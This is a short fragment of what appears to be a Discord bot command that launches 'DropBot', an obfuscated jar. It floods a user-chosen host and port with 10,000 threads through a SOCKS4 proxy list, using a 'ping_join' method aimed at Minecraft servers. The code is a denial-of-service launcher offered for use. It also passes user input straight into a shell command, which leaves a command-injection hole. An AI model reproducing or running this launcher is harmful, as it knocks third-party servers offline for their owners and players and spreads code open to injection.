...
module.exports = {
  ...
  run: async ({client, message, args, MessageEmbed}) => {
    ...
    exec(`screen timeout 60 java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar DropBotv9-beta_obf.jar host=${host} port=${port} pfile=socks4_proxies.txt threads=10000 method=ping_join version=47 license=123ascqweq11`, (error, stdout, stderr) => {
    });
